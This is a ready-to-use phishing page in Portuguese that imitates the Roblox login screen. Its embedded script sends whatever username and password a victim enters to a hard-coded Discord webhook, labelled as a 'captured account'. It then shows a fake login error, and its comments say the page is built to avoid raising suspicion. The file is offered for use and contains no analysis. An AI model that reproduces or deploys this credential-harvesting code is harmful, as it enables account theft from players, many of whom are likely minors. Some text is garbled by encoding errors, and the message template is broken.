<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox - Entrar</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background: #0d1117;
      color: #e1e1e1;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(0, 170, 255, 0.08) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(170, 0, 255, 0.06) 0%, transparent 50%);
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 40px 30px;
      background: rgba(20, 20, 25, 0.92);
      border-radius: 12px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.7);
      border: 1px solid rgba(100,100,120,0.25);
      text-align: center;
    }

    .logo {
      font-size: 3.4rem;
      font-weight: bold;
      color: #00aaff;
      margin-bottom: 8px;
      letter-spacing: -2px;
      text-shadow: 0 0 20px rgba(0,170,255,0.4);
    }

    .subtitle {
      font-size: 1.1rem;
      color: #a0a0c0;
      margin-bottom: 32px;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 0.95rem;
      color: #d0d0e0;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #444;
      border-radius: 8px;
      background: #1a1a22;
      color: white;
      font-size: 1rem;
      transition: border-color 0.2s, box-shadow 0.2s;
    }

    input:focus {
      outline: none;
      border-color: #00aaff;
      box-shadow: 0 0 0 3px rgba(0,170,255,0.25);
    }

    .btn-login {
      width: 100%;
      padding: 14px;
      background: #00aaff;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1.1rem;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.25s;
      margin: 12px 0 20px;
    }

    .btn-login:hover {
      background: #0088dd;
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0,140,230,0.4);
    }

    .error-message {
      background: rgba(255, 80, 80, 0.18);
      color: #ff6666;
      padding: 14px;
      border-radius: 8px;
      margin: 16px 0;
      font-weight: bold;
      opacity: 0;
      transform: translateY(-12px);
      transition: all 0.4s ease;
      border: 1px solid rgba(255, 80, 80, 0.4);
    }

    .error-message.show {
      opacity: 1;
      transform: translateY(0);
      animation: shake 0.6s ease;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
      20%, 40%, 60%, 80% { transform: translateX(10px); }
    }

    .links {
      font-size: 0.92rem;
      color: #8888aa;
      margin: 16px 0;
    }

    .links a {
      color: #00aaff;
      text-decoration: none;
      margin: 0 12px;
    }

    .links a:hover {
      text-decoration: underline;
    }

    .signup {
      margin-top: 24px;
      font-size: 0.95rem;
    }

    .signup a {
      color: #00ff88;
      font-weight: bold;
      text-decoration: none;
    }

    .signup a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">R O B L O X</div>
    <div class="subtitle">Entre na sua conta</div>

    <form id="loginForm">
      <div class="form-group">
        <label for="username">Nome de usu√°rio / Email / Telefone</label>
        <input type="text" id="username" placeholder="Digite seu usu√°rio ou email" required>
      </div>

      <div class="form-group">
        <label for="password">Senha</label>
        <input type="password" id="password" placeholder="Senha" required>
      </div>

      <div id="errorMsg" class="error-message">Senha ou nome inv√°lido!!</div>

      <button type="submit" class="btn-login">Entrar</button>
    </form>

    <div class="links">
      <a href="#">Esqueceu usu√°rio ou senha?</a>
    </div>

    <div class="signup">
      N√£o tem conta? <a href="#">Cadastrar-se</a>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    // COLE AQUI A URL DO SEU WEBHOOK DO DISCORD
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm';  // ‚Üê Substitua isso pela URL real (ex: https://discord.com/api/webhooks/123456/abcdef...)

    form.addEventListener('submit', async function(e) {
      e.preventDefault(); // N√£o recarrega a p√°gina

      const login = usernameInput.value.trim();
      const senha = passwordInput.value.trim();

      // Mostra erro na tela (e mant√©m para sempre)
      errorMsg.classList.add('show');
      errorMsg.style.animation = 'none';
      errorMsg.offsetHeight; // for√ßa reflow para anima√ß√£o repetir
      errorMsg.style.animation = null;

      // Envia pro Discord se tiver algo digitado e webhook configurado
      if (login && senha && WEBHOOK_URL !== 'SEU_WEBHOOK_AQUI') {
        try {
          const mensagem = `üîê **Nova Conta Capturada**\n\n**Login:**\n\( {login}\n\n**Senha:**\n \){senha}`;

          const payload = {
            content: mensagem,
            username: "Roblox Captura",  // opcional: nome do webhook
            avatar_url: "https://www.roblox.com/favicon.ico"  // opcional: √≠cone
          };

          await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          // Se quiser ver no console do navegador: console.log('Enviado para Discord!');
        } catch (err) {
          console.error('Falha ao enviar:', err);
          // N√£o mostra nada pro usu√°rio pra n√£o levantar suspeita
        }
      }
    });
  </script>

</body>
</html>
